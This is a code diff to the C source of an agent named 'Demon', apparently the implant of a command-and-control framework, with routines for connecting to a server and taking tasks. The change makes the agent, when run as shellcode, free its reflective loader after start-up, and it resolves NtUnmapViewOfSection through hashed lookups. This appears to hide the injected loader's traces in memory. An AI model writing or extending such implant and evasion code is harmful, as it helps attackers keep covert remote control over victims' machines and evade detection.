@@ -27,11 +27,12 @@ SEC_DATA BYTE     AgentConfig[] = CONFIG_BYTES;
  *
  * 1. Initialize pointer, modules and win32 api
  * 2. Initialize metadata
- * 3. Parse config
- * 4. Enter main connecting and tasking routine
+ * 3. Free the reflective loader (if any)
+ * 4. Parse config
+ * 5. Enter main connecting and tasking routine
  *
  * */
-VOID DemonMain( PVOID ModuleInst )
+VOID DemonMain( PVOID ModuleInst, PVOID ReflectiveLdrAddr )
 {
     /* Use passed module agent instance */
     if ( ModuleInst ) {
@@ -40,6 +41,11 @@ VOID DemonMain( PVOID ModuleInst )
 
     /* Initialize Win32 API, Load Modules and Syscalls stubs (if we specified it) */
     DemonInit();
+
+#ifdef SHELLCODE
+    /* Free the reflective loader if we are shellcode */
+    FreeReflectiveLoader( ReflectiveLdrAddr );
+#endif
 
     /* Initialize MetaData */
     DemonMetaData( &Instance.MetaData, TRUE );
@@ -347,6 +353,7 @@ VOID DemonInit( VOID )
         Instance.Win32.NtContinue                        = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCONTINUE );
         Instance.Win32.NtReadVirtualMemory               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTREADVIRTUALMEMORY );
         Instance.Win32.NtFreeVirtualMemory               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTFREEVIRTUALMEMORY );
+        Instance.Win32.NtUnmapViewOfSection              = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTUNMAPVIEWOFSECTION );
         Instance.Win32.NtQueryVirtualMemory              = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYVIRTUALMEMORY );
         Instance.Win32.NtQueryInformationToken           = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONTOKEN );
         Instance.Win32.NtQueryInformationThread          = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONTHREAD );
